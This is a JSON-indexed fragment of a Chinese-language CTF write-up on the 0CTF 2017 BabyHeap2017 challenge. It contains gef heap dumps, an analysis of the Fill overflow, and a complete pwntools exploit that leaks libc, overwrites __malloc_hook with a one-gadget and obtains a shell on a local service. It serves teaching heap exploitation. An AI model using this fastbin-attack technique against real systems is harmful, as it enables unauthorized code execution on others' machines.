\nmain_arena\n:    0x0000000000000000  0x4141414141414141\n0x7ffff7dd1b30 \nmain_arena+16\n: 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/60gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021  \n-- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021\n0x555555757030: 0x0000000000000000  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021  \n-- new chunk 1\n0x555555757050: 0x4242424242424242  0x4242424242424242\n0x555555757060: 0x0000000000000000  0x0000000000000021  \n-- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000071  \n-- new chunk 2, new new chunk 4\n0x555555757090: 0x0000000000000000  0x0000000000000000\n0x5555557570a0: 0x0000000000000000  0x0000000000000000\n0x5555557570b0: 0x0000000000000000  0x0000000000000000\n0x5555557570c0: 0x0000000000000000  0x0000000000000000\n0x5555557570d0: 0x0000000000000000  0x0000000000000000\n0x5555557570e0: 0x0000000000000000  0x0000000000000000\n0x5555557570f0: 0x0000000000000000  0x0000000000000021      \n-- unsorted bin\n0x555555757100: 0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x555555757110: 0x0000000000000020  0x0000000000000090  \n-- chunk 5\n0x555555757120: 0x4141414141414141  0x4141414141414141\n0x555555757130: 0x4141414141414141  0x4141414141414141\n0x555555757140: 0x4141414141414141  0x4141414141414141\n0x555555757150: 0x4141414141414141  0x4141414141414141\n0x555555757160: 0x4141414141414141  0x4141414141414141\n0x555555757170: 0x4141414141414141  0x4141414141414141\n0x555555757180: 0x4141414141414141  0x4141414141414141\n0x555555757190: 0x4141414141414141  0x4141414141414141\n0x5555557571a0: 0x0000000000000000  0x0000000000020e61\n0x5555557571b0: 0x0000000000000000  0x0000000000000000\n0x5555557571c0: 0x0000000000000000  0x0000000000000000\n0x5555557571d0: 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/30gx 0xafc966564d0-0x10\n0xafc966564c0:  0x0000000000000001  0x0000000000000010  \n-- idx 0 -\n chunk 0\n0xafc966564d0:  0x0000555555757010  0x0000000000000001  \n-- idx 1 -\n new chunk 1\n0xafc966564e0:  0x0000000000000010  0x0000555555757050\n0xafc966564f0:  0x0000000000000001  0x0000000000000010  \n-- idx 2 -\n new chunk 2\n0xafc96656500:  0x0000555555757090  0x0000000000000001  \n-- idx 3 -\n chunk 3\n0xafc96656510:  0x0000000000000010  0x0000555555757070\n0xafc96656520:  0x0000000000000001  0x0000000000000060  \n-- idx 4 -\n new new chunk4\n0xafc96656530:  0x0000555555757090  0x0000000000000001  \n-- idx 5 -\n chunk 5\n0xafc96656540:  0x0000000000000080  0x0000555555757120\n0xafc96656550:  0x0000000000000001  0x0000000000000060  \n-- idx 6 -\n chunk 6\n0xafc96656560:  0x00007ffff7dd1b0d  0x0000000000000000\n0xafc96656570:  0x0000000000000000  0x0000000000000000\n0xafc96656580:  0x0000000000000000  0x0000000000000000\n0xafc96656590:  0x0000000000000000  0x0000000000000000\n0xafc966565a0:  0x0000000000000000  0x0000000000000000\n\n\n\n\u6700\u540e\uff0c\u53ea\u8981\u8c03\u7528\u4e86 malloc\uff0c\u5c31\u4f1a\u89e6\u53d1 hook \u51fd\u6570\uff0c\u5373 one-gadget\u3002\u73b0\u5728\u53ef\u4ee5\u5f00\u542f ASLR \u4e86\uff0c\u56e0\u4e3a\u901a\u8fc7\u6cc4\u6f0f libc \u5730\u5740\uff0c\u6211\u4eec\u5df2\u7ecf\u5b8c\u5168\u7ed5\u8fc7\u4e86\u5b83\u3002\n\n\nBingo!!!\n\n$ python exp.py\n[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] leak =\n 0x7f8c1be9eb78\n[*] libc =\n 0x7f8c1bada000\n[*] __malloc_hook =\n 0x7f8c1be9eb10\n[*] one_gadget =\n 0x7f8c1bb1f26a\n[*] Switching to interactive mode\n$ whoami\nfirmy\n\n\n\n\u672c\u9898\u591a\u6b21\u4f7f\u7528 fastbin attack\uff0c\u786e\u5b9e\u7ecf\u5178\u3002\n\n\nexploit\n\n\n\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\nio\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n10001\n)\n\n\n\ndef\n \nalloc\n(\nsize\n):\n\n    \nio\n.\nrecvuntil\n(\nCommand: \n)\n\n    \nio\n.\nsendline\n(\n1\n)\n\n    \nio\n.\nrecvuntil\n(\nSize: \n)\n\n    \nio\n.\nsendline\n(\nstr\n(\nsize\n))\n\n\n\ndef\n \nfill\n(\nidx\n,\n \ncont\n):\n\n    \nio\n.\nrecvuntil\n(\nCommand: \n)\n\n    \nio\n.\nsendline\n(\n2\n)\n\n    \nio\n.\nrecvuntil\n(\nIndex: \n)\n\n    \nio\n.\nsendline\n(\nstr\n(\nidx\n))\n\n    \nio\n.\nrecvuntil\n(\nSize: \n)\n\n    \nio\n.\nsendline\n(\nstr\n(\nlen\n(\ncont\n)))\n\n    \nio\n.\nrecvuntil\n(\nContent: \n)\n\n    \nio\n.\nsend\n(\ncont\n)\n\n\n\ndef\n \nfree\n(\nidx\n):\n\n    \nio\n.\nrecvuntil\n(\nCommand: \n)\n\n    \nio\n.\nsendline\n(\n3\n)\n\n    \nio\n.\nrecvuntil\n(\nIndex: \n)\n\n    \nio\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\ndef\n \ndump\n(\nidx\n):\n\n    \nio\n.\nrecvuntil\n(\nCommand: \n)\n\n    \nio\n.\nsendline\n(\n4\n)\n\n    \nio\n.\nrecvuntil\n(\nIndex: \n)\n\n    \nio\n.\nsendline\n(\nstr\n(\nidx\n))\n\n    \nio\n.\nrecvuntil\n(\nContent: \n\\n\n)\n\n    \ndata\n \n=\n \nio\n.\nrecvline\n()\n\n    \nreturn\n \ndata\n\n\n\nalloc\n(\n0x10\n)\n\n\nalloc\n(\n0x10\n)\n\n\nalloc\n(\n0x10\n)\n\n\nalloc\n(\n0x10\n)\n\n\nalloc\n(\n0x80\n)\n\n\n#fill(0, \nA\n*16)\n\n\n#fill(1, \nA\n*16)\n\n\n#fill(2, \nA\n*16)\n\n\n#fill(3, \nA\n*16)\n\n\n#fill(4, \nA\n*128)\n\n\n\nfree\n(\n1\n)\n\n\nfree\n(\n2\n)\n\n\n\npayload\n  \n=\n \nA\n*\n16\n\n\npayload\n \n+=\n \np64\n(\n0\n)\n\n\npayload\n \n+=\n \np64\n(\n0x21\n)\n\n\npayload\n \n+=\n \np64\n(\n0\n)\n\n\npayload\n \n+=\n \nA\n*\n8\n\n\npayload\n \n+=\n \np64\n(\n0\n)\n\n\npayload\n \n+=\n \np64\n(\n0x21\n)\n\n\npayload\n \n+=\n \np8\n(\n0x80\n)\n\n\nfill\n(\n0\n,\n \npayload\n)\n\n\n\npayload\n  \n=\n \nA\n*\n16\n\n\npayload\n \n+=\n \np64\n(\n0\n)\n\n\npayload\n \n+=\n \np64\n(\n0x21\n)\n\n\nfill\n(\n3\n,\n \npayload\n)\n\n\n\nalloc\n(\n0x10\n)\n\n\nalloc\n(\n0x10\n)\n\n\n#fill(1, \nB\n*16)\n\n\n#fill(2, \nC\n*16)\n\n\n#fill(4, \nD\n*16)\n\n\n\npayload\n  \n=\n \nA\n*\n16\n\n\npayload\n \n+=\n \np64\n(\n0\n)\n\n\npayload\n \n+=\n \np64\n(\n0x91\n)\n\n\nfill\n(\n3\n,\n \npayload\n)\n\n\n\nalloc\n(\n0x80\n)\n\n\n#fill(5, \nA\n*128)\n\n\n\nfree\n(\n4\n)\n\n\n\nleak\n \n=\n \nu64\n(\ndump\n(\n2\n)[:\n8\n])\n\n\nlibc\n \n=\n \nleak\n \n-\n \n0x3c4b78\n          \n# 0x3c4b78 = leak - libc\n\n\n__malloc_hook\n \n=\n \nlibc\n \n+\n \n0x3c4b10\n    \n# readelf -s libc.so.6 | grep __malloc_hook@\n\n\none_gadget\n \n=\n \nlibc\n \n+\n \n0x4526a\n\n\nlog\n.\ninfo\n(\nleak =\n 0x\n%x\n \n%\n \nleak\n)\n\n\nlog\n.\ninfo\n(\nlibc =\n 0x\n%x\n \n%\n \nlibc\n)\n\n\nlog\n.\ninfo\n(\n__malloc_hook =\n 0x\n%x\n \n%\n \n__malloc_hook\n)\n\n\nlog\n.\ninfo\n(\none_gadget =\n 0x\n%x\n \n%\n \none_gadget\n)\n\n\n\nalloc\n(\n0x60\n)\n\n\nfree\n(\n4\n)\n\n\n\npayload\n \n=\n \np64\n(\nlibc\n \n+\n \n0x3c4afd\n)\n\n\nfill\n(\n2\n,\n \npayload\n)\n\n\n\nalloc\n(\n0x60\n)\n\n\nalloc\n(\n0x60\n)\n\n\n\npayload\n  \n=\n \np8\n(\n0\n)\n*\n3\n\n\npayload\n \n+=\n \np64\n(\none_gadget\n)\n\n\nfill\n(\n6\n,\n \npayload\n)\n\n\n\nalloc\n(\n1\n)\n\n\nio\n.\ninteractive\n()\n\n\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\n0ctf Quals 2017 - BabyHeap2017\n\n\nhow2heap", 
            "title": "0CTF2017 BabyHeap2017"
        }, 
        {
            "location": "/pwn/lab/6.1.10_0ctf2017_babyheap2017/#_1", 
            "text": "\u8fd9\u4e2a\u9898\u76ee\u7ed9\u51fa\u4e86\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u5728 Ubuntu 16.04 \u4e0a\uff0clibc \u5c31\u7528\u81ea\u5e26\u7684\u3002 $ file babyheap\nbabyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped\n$ checksec -f babyheap\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY   Fortified Fortifiable  FILE\nFull RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   Yes       0               2       babyheap\n$ file /lib/x86_64-linux-gnu/libc-2.23.so\n/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped \n64 \u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5168\u5f00\u3002  \u628a\u5b83\u8fd0\u884c\u8d77\u6765\uff1a socat tcp4-listen:10001,reuseaddr,fork exec:./babyheap    \u4e00\u4e2a\u5178\u578b\u7684\u5806\u5229\u7528\u9898\u76ee\uff1a $ ./babyheap\n===== Baby Heap in 2017 =====\n1. Allocate\n2. Fill\n3. Free\n4. Dump\n5. Exit\nCommand: 1      // \u5206\u914d\u4e00\u4e2a\u6307\u5b9a\u5927\u5c0f\u7684 chunk\nSize: 5\nAllocate Index 0\n1. Allocate\n2. Fill\n3. Free\n4. Dump\n5. Exit\nCommand: 2      // \u5c06\u6307\u5b9a\u5927\u5c0f\u6570\u636e\u653e\u8fdb chunk\uff0c\u4f46\u4f3c\u4e4e\u6ca1\u6709\u8fdb\u884c\u8fb9\u754c\u68c0\u67e5\uff0c\u5bfc\u81f4\u6ea2\u51fa\nIndex: 0\nSize: 10\nContent: aaaaaaaaaa     // 10\u4e2aa\n1. Allocate\n2. Fill\n3. Free\n4. Dump\n5. Exit\nCommand: 1. Allocate    // \u4f3c\u4e4e\u89e6\u53d1\u4e86\u4ec0\u4e48 bug\uff0c\u5982\u679c\u662f9\u4e2aa\u5c31\u6ca1\u4e8b\n2. Fill\n3. Free\n4. Dump\n5. Exit\nCommand: 4      // \u6253\u5370\u51fa chunk \u7684\u5185\u5bb9\uff0c\u957f\u5ea6\u662f\u65b0\u5efa\u65f6\u7684\u957f\u5ea6\uff0c\u800c\u4e0d\u662f\u653e\u5165\u6570\u636e\u7684\u957f\u5ea6\nIndex: 0\nContent:\naaaaa\n1. Allocate\n2. Fill\n3. Free\n4. Dump\n5. Exit\nCommand: 3      // \u91ca\u653e chunk\nIndex: 0\n1. Allocate\n2. Fill\n3. Free\n4. Dump\n5. Exit\nCommand: 5", 
            "title": "\u9898\u76ee\u590d\u73b0"
        }, 
        {
            "location": "/pwn/lab/6.1.10_0ctf2017_babyheap2017/#_2", 
            "text": "\u6839\u636e\u524d\u9762\u6240\u5b66\u7684\u77e5\u8bc6\uff0c\u6211\u4eec\u77e5\u9053\u91ca\u653e\u4e14\u53ea\u91ca\u653e\u4e86\u4e00\u4e2a chunk \u540e\uff0c\u8be5 free chunk \u4f1a\u88ab\u52a0\u5165\u5230 unsorted bin \u4e2d\uff0c\u5b83\u7684 fd/bk \u6307\u9488\u6307\u5411\u4e86 libc \u4e2d\u7684 main_arena \u7ed3\u6784\u3002\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86 Fill \u6570\u636e\u7684\u64cd\u4f5c\u5b58\u5728\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4f46\u5e76\u6ca1\u6709\u53d1\u73b0 UAF \u6f0f\u6d1e\uff0c\u6240\u4ee5\u8981\u60f3\u6cc4\u9732\u51fa libc \u57fa\u5740\uff0c\u5f97\u5229\u7528 Dump \u64cd\u4f5c\u3002\u53e6\u5916\u5185\u5b58\u5206\u914d\u4f7f\u7528\u4e86 calloc \u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e0e malloc \u7684\u533a\u522b\u662f\uff0ccalloc \u4f1a\u5c06\u5206\u914d\u7684\u5185\u5b58\u7a7a\u95f4\u6bcf\u4e00\u4f4d\u90fd\u521d\u59cb\u5316\u4e3a 0\uff0c\u6240\u4ee5\u4e5f\u4e0d\u80fd\u901a\u8fc7\u5206\u914d\u548c\u91ca\u653e\u51e0\u4e2a\u5c0f chunk\uff0c\u518d\u5206\u914d\u4e00\u4e2a\u5927 chunk\uff0c\u6765\u6cc4\u9732\u5176\u5185\u5bb9\u3002  \u600e\u4e48\u5229\u7528 Dump \u64cd\u4f5c\u5462\uff1f\u5982\u679c\u80fd\u4f7f\u4e24\u4e2a chunk \u76f8\u91cd\u53e0\uff0cFree \u4e00\u4e2a\uff0cDump \u53e6\u4e00\u4e2a\uff0c\u6216\u8bb8\u53ef\u884c\u3002", 
            "title": "\u9898\u76ee\u89e3\u6790"
        }, 
        {
            "location": "/pwn/lab/6.1.10_0ctf2017_babyheap2017/#leak-libc", 
            "text": "\u8fd8\u662f\u4e00\u6837\u7684\uff0c\u4e3a\u4e86\u65b9\u4fbf\u8c03\u8bd5\uff0c\u5148\u5173\u6389 ASLR\u3002\u9996\u5148\u5206\u914d 3 \u4e2a fast chunk \u548c 1 \u4e2a small chunk\uff0c\u5176\u5b9e\u586b\u5145\u6570\u636e\u5bf9\u6f0f\u6d1e\u5229\u7528\u662f\u6ca1\u6709\u610f\u4e49\u7684\uff0c\u8fd9\u91cc\u53ea\u662f\u4e3a\u4e86\u65b9\u4fbf\u89c2\u5bdf\uff1a alloc ( 0x10 )  alloc ( 0x10 )  alloc ( 0x10 )  alloc ( 0x10 )  alloc ( 0x80 )  fill ( 0 ,   A * 16 )  fill ( 1 ,   A * 16 )  fill ( 2 ,   A * 16 )  fill ( 3 ,   A * 16 )  fill ( 4 ,   A * 128 )   gef\u27a4  x/40gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021   -- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021   -- chunk 1\n0x555555757030: 0x4141414141414141  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021   -- chunk 2\n0x555555757050: 0x4141414141414141  0x4141414141414141\n0x555555757060: 0x0000000000000000  0x0000000000000021   -- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000091   -- chunk 4\n0x555555757090: 0x4141414141414141  0x4141414141414141\n0x5555557570a0: 0x4141414141414141  0x4141414141414141\n0x5555557570b0: 0x4141414141414141  0x4141414141414141\n0x5555557570c0: 0x4141414141414141  0x4141414141414141\n0x5555557570d0: 0x4141414141414141  0x4141414141414141\n0x5555557570e0: 0x4141414141414141  0x4141414141414141\n0x5555557570f0: 0x4141414141414141  0x4141414141414141\n0x555555757100: 0x4141414141414141  0x4141414141414141\n0x555555757110: 0x0000000000000000  0x0000000000020ef1   -- top chunk\n0x555555757120: 0x0000000000000000  0x0000000000000000\n0x555555757130: 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/20gx 0xafc966564d0-0x10\n0xafc966564c0:  0x0000000000000001  0x0000000000000010   -- idx 0 -  chunk 0\n0xafc966564d0:  0x0000555555757010  0x0000000000000001   -- idx 1 -  chunk 1\n0xafc966564e0:  0x0000000000000010  0x0000555555757030\n0xafc966564f0:  0x0000000000000001  0x0000000000000010   -- idx 2 -  chunk 2\n0xafc96656500:  0x0000555555757050  0x0000000000000001   -- idx 3 -  chunk 3\n0xafc96656510:  0x0000000000000010  0x0000555555757070\n0xafc96656520:  0x0000000000000001  0x0000000000000080   -- idx 4 -  chunk 4\n0xafc96656530:  0x0000555555757090  0x0000000000000000\n0xafc96656540:  0x0000000000000000  0x0000000000000000\n0xafc96656550:  0x0000000000000000  0x0000000000000000 \n\u53e6\u5916\u6211\u4eec\u770b\u5230\uff0cchunk \u7684\u5e8f\u53f7\u88ab\u5b58\u50a8\u5230\u4e00\u4e2a mmap \u5206\u914d\u51fa\u6765\u7684\u7ed3\u6784\u4f53\u4e2d\uff0c\u5305\u542b\u4e86 chunk \u7684\u5730\u5740\u548c\u5927\u5c0f\u3002\u7a0b\u5e8f\u5c31\u662f\u901a\u8fc7\u8be5\u7ed3\u6784\u4f53\u5bfb\u627e chunk\uff0c\u7136\u540e\u5404\u79cd\u64cd\u4f5c\u7684\u3002  free \u6389\u4e24\u4e2a fast chunk\uff0c\u8fd9\u6837 chunk 2 \u7684 fd \u6307\u9488\u4f1a\u88ab\u6307\u5411 chunk 1\uff1a free ( 1 )  free ( 2 )   gef\u27a4  x/2gx  main_arena\n0x7ffff7dd1b20  main_arena :    0x0000000000000000  0x0000555555757040\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x555555757050, size=0x20, flags=PREV_INUSE)  \u2190  Chunk(addr=0x555555757030, size=0x20, flags=PREV_INUSE)\ngef\u27a4  x/40gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021   -- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021   -- chunk 1 [be freed]\n0x555555757030: 0x0000000000000000  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021   -- chunk 2 [be freed]   -- fast bins\n0x555555757050: 0x0000555555757020  0x4141414141414141       -- fd pointer\n0x555555757060: 0x0000000000000000  0x0000000000000021   -- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000091   -- chunk 4\n0x555555757090: 0x4141414141414141  0x4141414141414141\n0x5555557570a0: 0x4141414141414141  0x4141414141414141\n0x5555557570b0: 0x4141414141414141  0x4141414141414141\n0x5555557570c0: 0x4141414141414141  0x4141414141414141\n0x5555557570d0: 0x4141414141414141  0x4141414141414141\n0x5555557570e0: 0x4141414141414141  0x4141414141414141\n0x5555557570f0: 0x4141414141414141  0x4141414141414141\n0x555555757100: 0x4141414141414141  0x4141414141414141\n0x555555757110: 0x0000000000000000  0x0000000000020ef1\n0x555555757120: 0x0000000000000000  0x0000000000000000\n0x555555757130: 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/20gx 0xafc966564d0-0x10\n0xafc966564c0:  0x0000000000000001  0x0000000000000010   -- idx 0 -  chunk 0\n0xafc966564d0:  0x0000555555757010  0x0000000000000000\n0xafc966564e0:  0x0000000000000000  0x0000000000000000\n0xafc966564f0:  0x0000000000000000  0x0000000000000000\n0xafc96656500:  0x0000000000000000  0x0000000000000001   -- idx 3 -  chunk 3\n0xafc96656510:  0x0000000000000010  0x0000555555757070\n0xafc96656520:  0x0000000000000001  0x0000000000000080   -- idx 4 -  chunk 4\n0xafc96656530:  0x0000555555757090  0x0000000000000000\n0xafc96656540:  0x0000000000000000  0x0000000000000000\n0xafc96656550:  0x0000000000000000  0x0000000000000000 \nfree \u6389\u7684 chunk\uff0c\u5176\u7ed3\u6784\u4f53\u88ab\u6e05\u7a7a\uff0c\u7b49\u5f85\u4e0b\u4e00\u6b21 malloc\uff0c\u5e76\u6dfb\u52a0\u5230\u7a7a\u51fa\u6765\u7684\u5730\u65b9\u3002  \u901a\u8fc7\u6ea2\u51fa\u6f0f\u6d1e\u4fee\u6539\u5df2\u88ab\u91ca\u653e\u7684 chunk 2\uff0c\u8ba9 fd \u6307\u9488\u6307\u5411 chunk 4\uff0c\u8fd9\u6837\u5c31\u5c06 small chunk \u52a0\u5165\u5230\u4e86 fastbins \u94fe\u8868\u4e2d\uff0c\u7136\u540e\u8fd8\u9700\u8981\u628a chunk 4 \u7684 0x91 \u6539\u6210 0x21 \u4ee5\u7ed5\u8fc7 fastbins \u5927\u5c0f\u7684\u68c0\u67e5\uff1a payload    =   A * 16  payload   +=   p64 ( 0 )  payload   +=   p64 ( 0x21 )  payload   +=   p64 ( 0 )  payload   +=   A * 8  payload   +=   p64 ( 0 )  payload   +=   p64 ( 0x21 )  payload   +=   p8 ( 0x80 )  fill ( 0 ,   payload )  payload    =   A * 16  payload   +=   p64 ( 0 )  payload   +=   p64 ( 0x21 )  fill ( 3 ,   payload )   gef\u27a4  x/2gx  main_arena\n0x7ffff7dd1b20  main_arena :    0x0000000000000000  0x0000555555757040\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x555555757050, size=0x20, flags=PREV_INUSE)  \u2190  Chunk(addr=0x555555757090, size=0x20, flags=PREV_INUSE)  \u2190  [Corrupted chunk at 0x4141414141414151]\ngef\u27a4  x/40gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021   -- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021   -- chunk 1 [be freed]\n0x555555757030: 0x0000000000000000  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021   -- chunk 2 [be freed]   -- fast bins\n0x555555757050: 0x0000555555757080  0x4141414141414141       -- fd pointer\n0x555555757060: 0x0000000000000000  0x0000000000000021   -- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000021   -- chunk 4\n0x555555757090: 0x4141414141414141  0x4141414141414141\n0x5555557570a0: 0x4141414141414141  0x4141414141414141\n0x5555557570b0: 0x4141414141414141  0x4141414141414141\n0x5555557570c0: 0x4141414141414141  0x4141414141414141\n0x5555557570d0: 0x4141414141414141  0x4141414141414141\n0x5555557570e0: 0x4141414141414141  0x4141414141414141\n0x5555557570f0: 0x4141414141414141  0x4141414141414141\n0x555555757100: 0x4141414141414141  0x4141414141414141\n0x555555757110: 0x0000000000000000  0x0000000000020ef1\n0x555555757120: 0x0000000000000000  0x0000000000000000\n0x555555757130: 0x0000000000000000  0x0000000000000000  \u73b0\u5728\u6211\u4eec\u518d\u5206\u914d\u4e24\u4e2a chunk\uff0c\u5b83\u4eec\u90fd\u4f1a\u4ece fastbins \u4e2d\u88ab\u53d6\u51fa\u6765\uff0c\u800c\u4e14 new chunk 2 \u4f1a\u548c\u539f\u6765\u7684 chunk 4 \u8d77\u59cb\u4f4d\u7f6e\u91cd\u53e0\uff0c\u4f46\u524d\u8005\u662f fast chunk\uff0c\u800c\u540e\u8005\u662f small chunk\uff0c\u5373\u4e00\u4e2a\u5927 chunk \u91cc\u5305\u542b\u4e86\u4e00\u4e2a\u5c0f chunk\uff0c\u8fd9\u6b63\u662f\u6211\u4eec\u9700\u8981\u7684\uff1a alloc ( 0x10 )  alloc ( 0x10 )  fill ( 1 ,   B * 16 )  fill ( 2 ,   C * 16 )  fill ( 4 ,   D * 16 )   gef\u27a4  x/2gx  main_arena\n0x7ffff7dd1b20  main_arena :    0x0000000000000000  0x4141414141414141\ngef\u27a4  x/40gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021   -- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021   -- chunk 1 [be freed]\n0x555555757030: 0x0000000000000000  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021   -- new chunk 1\n0x555555757050: 0x4242424242424242  0x4242424242424242\n0x555555757060: 0x0000000000000000  0x0000000000000021   -- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000021   -- chunk 4, new chunk 2\n0x555555757090: 0x4444444444444444  0x4444444444444444\n0x5555557570a0: 0x0000000000000000  0x4141414141414141\n0x5555557570b0: 0x4141414141414141  0x4141414141414141\n0x5555557570c0: 0x4141414141414141  0x4141414141414141\n0x5555557570d0: 0x4141414141414141  0x4141414141414141\n0x5555557570e0: 0x4141414141414141  0x4141414141414141\n0x5555557570f0: 0x4141414141414141  0x4141414141414141\n0x555555757100: 0x4141414141414141  0x4141414141414141\n0x555555757110: 0x0000000000000000  0x0000000000020ef1\n0x555555757120: 0x0000000000000000  0x0000000000000000\n0x555555757130: 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/20gx 0xafc966564d0-0x10\n0xafc966564c0:  0x0000000000000001  0x0000000000000010   -- idx 0 -  chunk 0\n0xafc966564d0:  0x0000555555757010  0x0000000000000001   -- idx 1 -  new chunk 1\n0xafc966564e0:  0x0000000000000010  0x0000555555757050\n0xafc966564f0:  0x0000000000000001  0x0000000000000010   -- idx 2 -  new chunk 2\n0xafc96656500:  0x0000555555757090  0x0000000000000001   -- idx 3 -  chunk 3\n0xafc96656510:  0x0000000000000010  0x0000555555757070\n0xafc96656520:  0x0000000000000001  0x0000000000000080   -- idx 4 -  chunk 4\n0xafc96656530:  0x0000555555757090  0x0000000000000000\n0xafc96656540:  0x0000000000000000  0x0000000000000000\n0xafc96656550:  0x0000000000000000  0x0000000000000000 \n\u53ef\u4ee5\u770b\u5230\u65b0\u5206\u914d\u7684 chunk 2\uff0c\u586b\u8865\u5230\u4e86\u88ab\u91ca\u653e\u7684 chunk 2 \u7684\u4f4d\u7f6e\u4e0a\u3002  \u518d\u6b21\u5229\u7528\u6ea2\u51fa\u6f0f\u6d1e\u5c06 chunk 4 \u7684 0x21 \u6539\u56de 0x91\uff0c\u7136\u540e\u4e3a\u4e86\u907f\u514d free(4) \u540e\u8be5 chunk \u88ab\u5408\u5e76\u8fdb top chunk\uff0c\u9700\u8981\u518d\u5206\u914d\u4e00\u4e2a small chunk\uff1a payload    =   A * 16  payload   +=   p64 ( 0 )  payload   +=   p64 ( 0x91 )  fill ( 3 ,   payload )  alloc ( 0x80 )  fill ( 5 ,   A * 128 )   gef\u27a4  x/60gx 0x0000555555757010-0x10\n0x555555757000: 0x0000000000000000  0x0000000000000021   -- chunk 0\n0x555555757010: 0x4141414141414141  0x4141414141414141\n0x555555757020: 0x0000000000000000  0x0000000000000021\n0x555555757030: 0x0000000000000000  0x4141414141414141\n0x555555757040: 0x0000000000000000  0x0000000000000021   -- new chunk 1\n0x555555757050: 0x4242424242424242  0x4242424242424242\n0x555555757060: 0x0000000000000000  0x0000000000000021   -- chunk 3\n0x555555757070: 0x4141414141414141  0x4141414141414141\n0x555555757080: 0x0000000000000000  0x0000000000000091   -- chunk 4, new chunk 2\n0x555555757090: 0x4444444444444444  0x4444444444444444\n0x5555557570a0: 0x0000000000000000  0x4141414141414141\n0x5555557570b0: 0x4141414141414141  0x4141414141414141\n0x5555557570c0: 0x4141414141414141  0x4141414141414141\n0x5555557570d0: 0x4141414141414141  0x4141414141414141\n0x5555557570e0: 0x4141414141414141  0x4141414141414141\n0x5555557570f0: 0x4141414141414141  0x4141414141414141\n0x555555757100: 0x4141414141414141  0x4141414141414141\n0x555555757110: 0x0000000000000000  0x0000000000000091   -- chunk 5\n0x555555757120: 0x4141414141414141  0x4141414141414141\n0x555555757130: 0x4141414141414141  0x4141414141414141\n0x555555757140: 0x4141414141414141  0x4141414141414141\n0x555555757150: 0x4141414141414141  0x4141414141414141\n0x555555757160: 0x4141414141414141  0x4141414141414141\n0x555555757170: 0x4141414141414141  0x4141414141414141\n0x555555757180: 0x4141414141414141  0x4141414141414141\n0x555555757190: 0x4141414141414141  0x4141414141414141\n0x5555557571a0: 0x0000000000000000  0x0000000000020e61   -- top chunk\n0x5555557571b0: 0x0000000000000000  0x0000000000000000\n0x5555557571c0: 0x0000000000000000  0x0000000000000000\n0x5555557571d0: 0x0000000000000000  0x0000000000000000\ngef\u27a4  x/20gx 0xafc966564d0-0x10\n0xafc966564c0:  0x0000000000000001  0x0000000000000010   -- idx 0 -  chunk 0\n0xafc966564d0:  0x0000555555757010  0x0000000000000001   -- idx 1 -  new chunk 1\n0xafc966564e0:  0x0000000000000010  0x0000555555757050\n0xafc966564f0:  0x0000000000000001  0x0000000000000010   -- idx 2 -  new chunk 2\n0xafc96656500:  0x0000555555757090  0x0000000000000001   -- idx 3 -  chunk 3\n0xafc96656510:  0x0000000000000010  